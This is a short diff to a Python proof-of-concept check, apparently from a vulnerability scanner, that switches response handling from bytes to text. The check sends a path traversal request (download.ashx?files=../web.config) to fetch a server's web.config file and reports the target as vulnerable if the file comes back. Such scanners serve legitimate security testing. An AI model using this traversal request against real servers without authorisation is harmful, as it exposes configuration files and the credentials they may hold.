@@ -48,8 +48,8 @@ class Poc(ABPoc):
             url = self.target
             verify_url = ('%s/download.ashx?files=../web.config') % url
             req = requests.get(verify_url)
-            if req.status_code == 200 and '<?xml version=' in req.content:
-                if 'configuration' in req.content:
+            if req.status_code == 200 and '<?xml version=' in req.text:
+                if 'configuration' in req.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
